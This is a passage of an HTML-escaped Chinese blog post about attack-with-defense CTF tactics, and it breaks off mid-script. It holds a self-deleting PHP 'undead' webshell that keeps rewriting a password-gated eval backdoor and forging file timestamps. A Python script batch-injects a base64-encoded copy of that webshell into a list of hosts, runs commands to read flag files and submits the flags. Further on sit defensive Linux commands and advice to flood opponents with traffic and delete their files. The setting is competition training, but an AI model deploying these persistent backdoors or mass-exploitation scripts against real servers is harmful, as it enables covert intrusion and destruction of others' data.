    &lt;span class=&#34;token function&#34;&gt;ignore_user_abort&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 设置与客户机断开是否会终止脚本的执行，这里设置为 true 则忽略与用户的断开，即使与客户机断开脚本仍会执行。&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;set_time_limit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 设置脚本最大执行时间，这里设置为 0，即没有时间方面的限制&lt;/span&gt;
    &lt;span class=&#34;token function&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;// 删除文件本身，以起到隐蔽自身的作用&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;&amp;lt;?php if(md5($_GET[&#34;pass&#34;])==&#34;1a1dc91c907325c69271ddf0c944bc72&#34;)&amp;#123;@eval($_POST[xcu]);&amp;#125; ?&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token comment&#34;&gt;//pass=pass&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;touch -m -d &#34;2018-12-01 09:10:12&#34; .config2.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;token function&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;chmod 777 .config.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token function&#34;&gt;usleep&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;//while 循环中每隔 usleep (0) 即写新的后门文件，system 命令用于修改文件的创建时间或修改时间，因为在 AWD 比赛中有的队伍使用&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time

&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; json

&lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;url.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;readlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;


nodie &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=&#34;&lt;/span&gt;
poc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;fputs(fopen(&#39;/var/www/html/nodie.php&#39;,&#39;w&#39;),base64_decode(&#39;PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7Cmlnbm9yZV91c2VyX2Fib3J0KDEpOwokZmlsZT0iLmNvbmZpZzEucGhwIjsKJHNoZWxsPSJQRDl3YUhBZ0pHWmtlVUk5WTNKbFlYUmxYMloxYm1OMGFXOXVLSE4wY2w5eWIzUXhNeWduSkNjcExtSmhjMlUyTkY5a1pXTnZaR1VvSjJOM1BUMG5LUzV6ZEhKZmNtOTBNVE1vSjJJbktTNWphSElvTUhnMlpqaGxMekI0TVRBMktTNWlZWE5sTmpSZlpHVmpiMlJsS0NkYVVUMDlKeWtzWTJoeUtEQjRNVFpqWmpFdk1IZ3pPV1FwTG1Ob2NpZ3hNRFk1TURndk9UQTJLUzVpWVhObE5qUmZaR1ZqYjJSbEtDZFpVVDA5SnlrdVkyaHlLREF5TXpZMU1EQXZNREV6TmpBcExuTjBjbDl5YjNReE15Z25LQ2NwTG1Ob2NpZ3dNVEEwTnkwd01UQXdNeWt1YzNSeVgzSnZkREV6S0NkbUp5a3VjM1J5WDNKdmRERXpLQ2RpSnlrdVltRnpaVFkwWDJSbFkyOWtaU2duWWxFOVBTY3BMbUpoYzJVMk5GOWtaV052WkdVb0oxcFJQVDBuS1M1aVlYTmxOalJmWkdWamIyUmxLQ2RMVVQwOUp5a3VjM1J5WDNKdmRERXpLQ2M3SnlrcE95Um1aSGxDS0dKaGMyVTJORjlrWldOdlpHVW9KMDFVVFRKTkp5NG5lbU4zVHpBbkxpZENiR1JyUmljdUozTkxRMUptSnk0bkp5NWphSElvTURFek5USXRNREV5TWpVcExtTm9jaWcyT0RNeE1DODVPVEFwTG1Ob2NpZ3dlR05qT1dZdk1IZ3pPVGNwTG1KaGMyVTJORjlrWldOdlpHVW9KMVpCUFQwbktTNXpkSEpmY205ME1UTW9KMGtuS1M0bkp5NG5KeTVqYUhJb09EQTNMVGN6TnlrdWMzUnlYM0p2ZERFektDZG5KeWt1WTJoeUtEVXdOVFEwTHprM01pa3VZMmh5S0RCNE16Rm1MVEI0TW1NMktTNWphSElvTURjME5EUXdMekF4TVRRd0tTNG5KeTRuVm1STFZITW5MaWN3VFVScmVDY3VKMDFVUVRjbkxpY25LU2s3UHo0PSI7CndoaWxlKDEpCntmaWxlX3B1dF9jb250ZW50cygkZmlsZSxiYXNlNjRfZGVjb2RlKCRzaGVsbCkpOwogICAgc3lzdGVtKCdjaG1vZCA3NzcgLmNvbmZpZy5waHAnKTsKICAgIHRvdWNoKCIuY29uZmlnLnBocCIpOwogICAgdXNsZWVwKDUwKTt9Owo=&#39;));&#34;&lt;/span&gt;

header2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;token&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
         &lt;span class=&#34;token string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#提交 flag&lt;/span&gt;
url4&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;

payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
payload3&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;xcu&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;system(&#39;cat /flag.txt&#39;);&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#执行命令&lt;/span&gt;
        url1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;?a=&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(url1)&lt;/span&gt;
        res1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        url2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;/nodie.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(url2)&lt;/span&gt;
        res2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        url3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://&amp;#123;&amp;#125;/.config1.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(url3)&lt;/span&gt;
        res3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url3&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; res3&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;compile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag.*&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;join&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;findall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;res&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;#print(a)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# 将 a 存入 paylaod2 中&lt;/span&gt;
        paylaod2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;flag&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a
        &lt;span class=&#34;token comment&#34;&gt;#time.sleep(1)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# print(paylaod2)&lt;/span&gt;
        &lt;span class=&#34;token comment&#34;&gt;# post 请求&lt;/span&gt;
        res2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; paylaod2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;header2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
        time&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;p&gt;防护常见命令&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;1 ssh &amp;lt;-p 端口&amp;gt; username@ip

2 scp 文件路径 username@ip:存放路径

3 cat &amp;#x2F;root&amp;#x2F;.bash_history

4 #显示最近登录的5个帐号

5 last -n 5|awk &amp;#39;&amp;#123;print $1&amp;#125;&amp;#39;

6 #显示&amp;#x2F;etc&amp;#x2F;passwd的账户

7 cat &amp;#x2F;etc&amp;#x2F;passwd|awk -F &amp;#39;:&amp;#39; &amp;#39;&amp;#123;print $1&amp;#125;&amp;#39;

8 #查看UID为0的帐号

9 awk -F: &amp;#39;&amp;#123;if($3&amp;#x3D;&amp;#x3D;0)print $1&amp;#125;&amp;#39; &amp;#x2F;etc&amp;#x2F;passwd10 #查找777的权限的文件

11 find . -name &amp;quot;*.php&amp;quot; -perm 4777

12 #查找24小时内被修改的PHP文件

13 find .&amp;#x2F; -mtime 0 -name &amp;quot;*.php&amp;quot;

14 #查看进程

15 ps aux | grep pid或者进程名

16 #查看已建立的网络连接及进程

17 netstat -antulp | grep EST

18 #查看指定端口被哪个进程占用

19 lsof -i:端口号 或者 netstat -tunlp|grep 端口号

20 #结束进程命令

21 kill PID

22 killall &amp;lt;进程名&amp;gt;

23 pkill &amp;lt;进程名&amp;gt;

24 pkill -u用户名

25 #封杀某个IP或者ip段

26 iptables -I INPUT -s source_ip[&amp;#x2F;mask] -j DROP

27 #禁止从某个主机ssh远程访问登陆到本机

28 iptable -t filter -A INPUT -s source_ip[&amp;#x2F;mask] -p tcp --dport 22 -j DROP

29 #备份mysql数据库

30 mysqldump -u 用户名 -p 密码 数据库名 &amp;gt; bak.sql

31 mysqldump --all-databases &amp;gt; bak.sql

32 #还原mysql数据库

33 mysql -u 用户名 -p 密码 数据库名 &amp;lt; bak.sql

34 #定时任务，在固定的时间间隔执行指定的系统指令或shell script

35 crontab [-u user] file_name

36 crontab [-u user] [-e |-l| -r]

37 #检测所有的tcp连接数量及状态

38 netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn

39 #查看页面访问排名前十的IP

40 cat &amp;#x2F;var&amp;#x2F;log&amp;#x2F;apache2&amp;#x2F;access.log|cut -f1 -d|sort|uniq -c|sort -k -r|head -

41 #查看页面访问排名前十的URL

42 cat &amp;#x2F;var&amp;#x2F;log&amp;#x2F;apache2&amp;#x2F;access.log|cut -f4 -d|sort|uniq -c|sort -k -r|head -&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;h2 id=&#34;最后&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#最后&#34;&gt;#&lt;/a&gt; 最后&lt;/h2&gt;
&lt;p&gt;是要做一名合格的搅屎棍&lt;/p&gt;
&lt;p&gt;恶心别人，核心就是发送大量垃圾数据包给别人 ，让别人无法正常观察流量捕捉 payload ，此招就是干扰对手利用他人的 payload 给对手造成干扰。但是有些比赛可能也会禁止。&lt;/p&gt;
&lt;p&gt;我们拿到 shell 后在规则允许的情况我们可以删除别人的文件，别人 check 丢分也相当于自己加分。&lt;/p&gt;
&lt;p&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests
&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; time

&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;scan_attack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
